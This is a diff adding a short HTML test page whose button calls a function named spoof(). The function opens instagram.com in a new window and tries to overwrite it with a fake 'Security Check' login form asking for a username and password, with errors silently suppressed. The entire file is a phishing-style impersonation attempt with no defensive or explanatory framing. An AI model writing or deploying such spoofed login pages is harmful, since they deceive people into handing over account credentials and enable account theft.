@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Simple Test</title>
+</head>
+<body>
+    <button onclick="spoof()">Click Me</button>
+
+    <script>
+        function spoof() {
+            let win = window.open("https://instagram.com", "_blank");
+            
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <title>Instagram</title>
+                        <h1>Instagram Security Check</h1>
+                        <p>Your session expired</p>
+                        <input placeholder="Username">
+                        <input type="password" placeholder="Password">
+                        <button>Login</button>
+                    `);
+                    win.document.close();
+                } catch(e) {}
+            }, 100);
+        }
+    </script>
+</body>
+</html>
